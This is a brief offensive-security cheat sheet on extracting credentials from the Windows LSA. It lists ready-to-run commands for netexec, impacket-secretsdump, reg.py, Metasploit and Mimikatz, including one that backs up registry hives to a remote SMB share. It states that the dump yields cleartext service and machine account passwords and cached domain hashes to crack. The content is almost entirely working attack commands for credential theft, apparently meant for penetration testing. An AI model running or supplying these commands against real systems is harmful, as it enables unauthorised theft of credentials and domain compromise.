# Extract Credentials from LSA

## Tools: CrackMpaExec/Netexec , impacket-secretsdump , reg.py

#### 1) CrackMapExec/Netexec

    netexec smb IP_RANGE -u USER -p 'PASSWORD' --lsa

#### 2) Impacket-secretsdump

    impacket-secretsdump DOMAIN/USER:PASSWORD@IP

#### 3) reg.py 

    reg.py DOMAIN/USER:PASSWORD@IP backup -o '\\SMB_IP\share'

    impacket-secretsdump -security SECURITY_FILE -system SYSTEM_FILE LOCAL

#### 4) Metasploit

    use post/windows/gather/lsa_secrets

#### 5) Mimikatz

    Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'

### With dumping LSA, we dump cleartext credentals for service and machine accounts as well as Cache domain logon (MsCache 2) hashes to crack
